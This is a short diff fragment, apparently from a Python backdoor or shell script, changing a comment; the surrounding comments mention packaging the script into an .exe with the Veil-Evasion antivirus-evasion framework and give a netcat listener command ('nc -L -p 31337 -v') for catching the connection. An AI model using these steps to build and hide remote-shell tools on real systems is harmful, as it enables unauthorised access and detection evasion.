@@ -22,5 +22,5 @@ while 1:
 
     # Veil-Evasion make .py to .exe
     # auxilary/pyinstaller-wrapper
-    # connect to nc
+    # connect to nc (Windows)
     #   nc -L -p 31337 -v
